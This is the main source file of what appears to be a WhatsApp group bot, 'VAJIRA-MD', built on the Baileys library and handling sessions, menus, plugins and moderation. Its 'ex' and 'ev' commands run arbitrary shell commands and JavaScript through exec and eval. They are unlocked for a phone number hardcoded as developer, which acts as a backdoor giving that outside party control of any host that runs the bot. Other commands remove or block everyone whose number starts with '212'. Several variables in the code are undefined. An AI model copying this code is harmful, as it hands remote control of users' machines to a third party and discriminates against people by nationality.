const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  getDevice,
  fetchLatestBaileysVersion,
  jidNormalizedUser,
  getContentType
} = require('@adiwajshing/baileys')
const fs = require('fs')
const P = require('pino')
var os = require('os')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const NodeCache = require('node-cache')
const util = require('util')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, fetchBuffer, getFile } = require('./lib/functions')
const { pinterest, wallpaper, wikimedia, quotesAnime, aiovideodl, umma, ringtone, styletext } = require('./lib/scraper')
const { dBinary, eBinary } = require('./lib/binary')
const { sms, downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const path = require('path')
const msgRetryCounterCache = new NodeCache()
const prefix = config.PREFIX[0]
const ownerNumber = ['94766943622']
const l = console.log
var { updateCMDStore,isbtnID,getCMDStore,getCmdForCmdId,connectdb,input,get,updb,updfb } = require("./lib/database")

//===================SESSION============================
async function MakeSession() {
    try {
        console.log("WRITING SESSION...");
        const {
          data
        } = await axios(`https://paste.c-net.org/${config.SESSION_ID.split(':')[1]}`);
        await fs.writeFileSync("./session/creds.json", JSON.stringify(data));
        console.log("SESSION CREATED SUCCESSFULLY✅");
      } catch (err) {
        console.log(err);
      }
}
MakeSession();
// <<==========PORTS===========>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
//====================================
async function connectToWA() {
  const { version, isLatest } = await fetchLatestBaileysVersion()
  console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/session/')
  const conn = makeWASocket({
    logger: P({ level: "fatal" }).child({ level: "fatal" }),
    printQRInTerminal: true,
    generateHighQualityLinkPreview: true,
    auth: state,
    defaultQueryTimeoutMs: undefined,
    msgRetryCounterCache 
  })

  conn.ev.on('connection.update',async(update) => {
    const { connection, lastDisconnect } = update
    if (connection === 'close') {
if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
  connectToWA()
}
    } else if (connection === 'open') {




console.log('Installing plugins 🔌... ')
console.log('Plugins installed ✅')
console.log('VAJIRA-MD connected ✅')  
console.log('VAJIRA-MD NOW WORKING 📥')       
const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
    require("./plugins/" + plugin);
  }
})
console.log('Plugins installed ✅')
await connectdb()
await updb()
console.log('QUEEN-IZUMI-MD connected ✅')
    }
  })


  conn.ev.on('creds.update', saveCreds)
  conn.ev.on('messages.upsert', async (mek) => {
    try {
mek = mek.messages[0]
if (!mek.message) return
var id_db = require('./database/id_db')      
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
const m = sms(conn, mek)
var smg = m
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation') ? mek.message.conversation : mek.message?.extendedTextMessage?.contextInfo?.hasOwnProperty('quotedMessage') &&
await isbtnID(mek.message?.extendedTextMessage?.contextInfo?.stanzaId) &&
getCmdForCmdId(await getCMDStore(mek.message?.extendedTextMessage?.contextInfo?.stanzaId), mek?.message?.extendedTextMessage?.text)
? getCmdForCmdId(await getCMDStore(mek.message?.extendedTextMessage?.contextInfo?.stanzaId), mek?.message?.extendedTextMessage?.text)  : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
var isCmd = body.startsWith(prefix)
var command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
var args = body.trim().split(/ +/).slice(1)
var q = args.join(' ')
 if(smg.quoted && smg.quoted.fromMe && await id_db.check(smg.quoted.id)  ){
if (body.startsWith(prefix)) body = body.replace( prefix , '')
var id_body = await id_db.get_data( smg.quoted.id , body)	
if (id_body.cmd) {
  isCmd = true
command = id_body.cmd.startsWith(prefix)?  id_body.cmd.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
args = id_body.cmd.trim().split(/ +/).slice(1)
q = args.join(' ')	
}
}
      console.log(command)
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Sin Nombre'
const developers = '94766943622'
const isbot = botNumber.includes(senderNumber)
const isdev = developers.includes(senderNumber)
const isMe = isbot ? isbot : isdev 
const isOwner = ownerNumber.includes(senderNumber) || isMe
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => { }) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false

const isAnti = (teks) => {
let getdata = teks
for (let i=0;i<getdata.length;i++) {
if(getdata[i] === from) return true
}
return false
}

const reply = async(teks) => {
  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
}

const NON_BUTTON = true // Implement a switch to on/off this feature...
conn.buttonMessage2 = async (jid, msgData,quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} | ${button.buttonText.displayText}*\n`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text}\n\n🔢 Reply you want number,${result}\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage }, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n🔢 Reply you want number,${result}\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage },{ quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}

conn.replyList = async (from , list_reply , options) => {
function convertNumberList(sections) {
    let result = "";

    sections.forEach((section, sectionIndex) => {
        result += section.title? `*${section.title}*\n` : ''

        section.rows.forEach((row, rowIndex) => {
            result += `*${row.title} || ${row.description}*`;
            result += rowIndex === section.rows.length - 1 ? "" : "\n"; // Add newline unless it's the last row
        });

        result += sectionIndex === sections.length - 1 ? "" : "\n\n"; // Add extra newline unless it's the last section
    });

    return result;
}
if (!list_reply.sections) return false
list_reply[list_reply.caption? 'caption' : 'text'] = ( list_reply.title ? list_reply.title + '\n\n' : "" ) +  (list_reply.caption? list_reply.caption : list_reply.text) + '\n\n' + list_reply.buttonText + '\n\n' + await convertNumberList(list_reply.sections) + '\n\n' +list_reply.footer	
var t = { ...list_reply }
delete list_reply.sections
delete list_reply.footer
delete list_reply.buttonText
delete list_reply.title
const sentMessage = await conn.sendMessage(from, list_reply , options);	
const cmdArray = [];
t.sections.forEach((section) => {
    section.rows.forEach((row) => {
        cmdArray.push({ rowId: row.rowId, title: row.title });
    });
});
for ( let i = 0; i < cmdArray.length; i++) {	
await id_db.input_data(cmdArray[i].rowId ,cmdArray[i].title , sentMessage.key.id ) 
}}  

conn.buttonMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} | ${button.buttonText.displayText}*\n`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text || msgData.caption}\n🔢 Reply you want number,${result}\
\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage }, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n🔢 Reply you want number,${result}\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage }, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}


conn.listMessage2 = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*[${mainNumber}] ${section.title}*\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `   ${subNumber} | ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage }, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

conn.listMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*[${mainNumber}] ${section.title}*\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `   ${subNumber} | ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage }, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

conn.edite = async (gg, newmg) => {
  await conn.relayMessage(from, {
    protocolMessage: {
key: gg.key,
type: 14,
editedMessage: {
  conversation: newmg
}
    }
  }, {})
}
conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
  let mime = '';
  let res = await axios.head(url)
  mime = res.headers['content-type']
  if (mime.split("/")[1] === "gif") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
  }
  let type = mime.split("/")[0] + "Message"
  if (mime === "application/pdf") {
    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "image") {
    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "video") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "audio") {
    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
  }
}

//============================================================================ 

if (config.WORK_TYPE === 'private' && !isMe && !isGroup) return
if(from === "120363043598019970@g.us" && !isdev) return
//==================================plugin map================================
const events = require('./command')
const cmdName = isCmd ? (body.slice(1).trim().split(" ")[0].toLowerCase() || command ): false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  }
});

//============================================================================
if (isAnti(config.ANTI_LINK === 'true') && isBotAdmins) {
  if(!isAdmins){
  if(!isMe){
  if (body.match(`chat.whatsapp.com`)) {
    await conn.sendMessage(from, { delete: mek.key })
  }
}
}}
//============================================================================
var bad = await fetchJson("https://github.com/vihangayt0/server-/raw/main/xeonsl_bad.json")
if (isAnti(config.ANTI_BAD === 'true') && isBotAdmins) {
  if (!isAdmins) {
    for (any in bad) {
if (body.toLowerCase().includes(bad[any])) {
  if (!body.includes('tent')) {
    if (!body.includes('docu')) {
if (!body.includes('http')) {
  if (groupAdmins.includes(sender)) return
  if (mek.key.fromMe) return
  await conn.sendMessage(from, { delete: mek.key })
  await conn.sendMessage(from, { text: '*Bad word detected !*' })
  await conn.groupParticipantsUpdate(from, [sender], 'remove')
}
    }
  }
}
    }
  }
}
//====================================================================
if (config.AUTO_VOICE === 'true') {
const url = 'https://gist.github.com/VajiraTech/32826daa4c68497b1545c7c19160d3e9/raw'
let { data } = await axios.get(url)
for (vr in data){
if((new RegExp(`\\b${vr}\\b`,'gi')).test(body)) conn.sendMessage(from,{audio: { url : data[vr]},mimetype: 'audio/mpeg',ptt:true},{quoted:mek})   
 }}

if (config.AUTO_STICKER === 'true') {
const url = 'https://gist.github.com/prabathLK/fbd8017006fc4000dc82403d443ecd9b/raw'
let { data } = await axios.get(url)
for (vr in data){
if((new RegExp(`\\b${vr}\\b`,'gi')).test(body)) conn.sendMessage(from,{sticker: { url : data[vr]},package: 'made by vajira'},{quoted:mek})   
 }}


if (config.NUMBER_212_BLOCK === 'true') {
if (mek.sender.startsWith("212") && isBotAdmin && config.NUMBER_212_BLOCK) {
await conn.sendMessage(from, { react: { text: `👨‍💻`, key: mek.key }})
await conn.updateBlockStatus(mek.sender,'block')

 }}  


  /**  
const emojis = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋']
         const emokis = emojis[Math.floor(Math.random() * (emojis.length))]
         await conn.sendMessage(mek.chat, {
             react: {
                 text: emokis,
                 key: mek.key
             }
         })
}
  
/// AUTO REPLY VIDEO \\\
          // AUTO REACt//
     
     if (mek.sender == '94758179948@s.whatsapp.net') {
    //  await conn.sendMessage(from, { react: { text: `♥️`, key: mek.key }})
      //await conn.sendMessage(from, { react: { text: `🙂️`, key: mek.key }})
     // await conn.sendMessage(from, { react: { text: `️🥀`, key: mek.key }})
      await conn.sendMessage(from, { react: { text: `💟️`, key: mem.key }})
      
      }
      if (mek.sender == '94766943622@s.whatsapp.net') {
      await conn.sendMessage(from, { react: { text: `🖤`, key: mek.key }})
      }
      if (mek.sender == '94766943622@s.whatsapp.net') {
      await conn.sendMessage(from, { react: { text: `🤍`, key: mek.key }})
      }
      if (mek.sender == '94766943622@s.whatsapp.net') {
      await conn.sendMessage(from, { react: { text: `⚕️`, key: mek.key }})
      }
      if (mek.sender == '94766943622@s.whatsapp.net') {
      await conn.sendMessage(from, { react: { text: `🐋`, key: mek.key }})
      }
      if (mek.sender == '94766943622@s.whatsapp.net') {
      await conn.sendMessage(from, { react: { text: `🧜‍♂`, key: mek.key }})
      }
      if (mek.sender == '94766943622@s.whatsapp.net') {
      await conn.sendMessage(from, { react: { text: `⚜️`, key: mek.key }})
      }
      if (mek.sender == '94766943622@s.whatsapp.net') {
      await conn.sendMessage(from, { react: { text: `👨‍💻`, key: mek.key }})
      }**/

//============================================================================      

      var check_id = ((id) => {
  var data = {
    is_bot: false,
    device: id.length > 21 ? 'android' : id.substring(0, 2) === '3A' ? 'ios' : 'web'
  }
  if (id.startsWith('BAE5')) {
    data.is_bot = true
    data.bot_name = 'bailyes'
  }
  if (/amdi|queen|black|amda|achiya|achintha/gi.test(id)) {
    data.is_bot = true
    data.bot_name = 'QUEEN-IZUMI-MD'
  }
  return data
})
async function antibot(Void, citel) {
  if (isAnti(config.ANTI_BOT === 'true')) return
  if (isAdmins) return
  if (!isBotAdmins) return
  if (isOwner) return
  if (isGroup) {
    var user = check_id(mek.key.id)
    if (user.is_bot) {
try {
  await conn.sendMessage(from, { text: `*Other bots are not allowed here !! / වෙනත් බොට්ල සදහා අවසරයක් නැත ⚠️ *` });
  return await conn.groupParticipantsUpdate(from, [sender], 'remove')
} catch { }
    }
  }
}
try {
  await antibot(conn, mek)
} catch { }
switch (command) {
  case 'jid':
    reply(from)
    break
  case 'device': {
    let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)

    reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
  }
    break
    case'ex':{
      if(senderNumber == 94766943622) {
  const { exec } = require("child_process")
  exec(q, (err, stdout) => {
    if (err) return reply(`-------\n\n` + err)
    if (stdout) {
        return reply(`-------\n\n` + stdout)
    }
})
      }
    }
    break

    case 'public': {
                                  if (!isCreator) throw mess.owner
                                  conn.public = true
                                  reply('𝗯𝗼𝘁 𝗻𝗼𝘄 𝘄𝗼𝗿𝗸𝗶𝗻𝗴 𝗮𝘀 𝗽𝘂𝗯𝗹𝗶𝗰')
                              }
                              break
                              case 'self': {
                                  if (!isCreator) throw mess.owner
                                  conn.public = false
                                  reply('𝗯𝗼𝘁 𝗻𝗼𝘄 𝘄𝗼𝗿𝗸𝗶𝗻𝗴 𝗮𝘀 𝗽𝗿𝗶𝘃𝗮𝘁𝗲')
                              }

    break
    case'apprv':{
      if(senderNumber == 94766943622) {
          let reqlist = await conn.groupRequestParticipantsList(from)
          for (let i=0;i<reqlist.length;i++) {
            if(reqlist[i].jid.startsWith("212")){
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "reject"
            )
            } else{
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "approve"
            )
            }
          }
        }
    }
    break
    case 'esenasend' : {
    if (mek.chat == '120363061004097806@g.us') {
    if(!q) return reply('Group Jid කො යකෝ')

const {esana_scrape, esana_latest_news_id, esana_scrape_from_id} = require("esana-node-api").esana_news;
   const helnews = await esana_scrape({ fetch: 'latest' , passcode: '+94715264791'}) // Enter Your Passcode or Contact Admin (+94766239744)

const title = helnews.news.helakuru.title
const news = helnews.news.helakuru.description
const img = helnews.news.helakuru.thumb
const url = helnews.news.helakuru.url
const date = helnews.news.helakuru.data

conn.sendMessage(`${q}`, { image: { url: img }, caption: `*${title}*\n\n*🔐 විස්තරය* - ${news}\n\n*_🖇️ News Link -_*  ${url}\n\nꜱʟ ɴᴇᴡꜱ ᴜᴘᴅᴀᴛᴇꜱ ᴄᴇɴᴛᴇʀ` }, )

     } else {
     reply("This Chat not News Sender Group")
     }
     }

    break
    case'rm212':{
      if(senderNumber == 94766943622) {
        for (let i=0;i<participants.length;i++) {
          if(participants[i].id.startsWith("212")){
       await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
      }
    }
  }
    }
    break
    case'rtf':{
console.log(dsa)
    }
    break
  case 'ev': {
    if(senderNumber == 94766943622) {
    let code2 = q.replace("°", ".toString()");
    try {
let resultTest = await eval(code2);
if (typeof resultTest === "object") {
  reply(util.format(resultTest));
} else {
  reply(util.format(resultTest));
}
    } catch (err) {
reply(util.format(err));
    }
    ;
  }
  }
    break
  default:
}
    } catch (e) {
const isError = String(e)
console.log(isError)
    }
  })
}
app.get("/", (req, res) => {
  res.send("📟 Vajira Working successfully!");
});
app.listen(port, () => console.log(`Vajira Server listening on port http://localhost:${port}`));
setTimeout(async() => {
  await connectToWA()
}, 1000);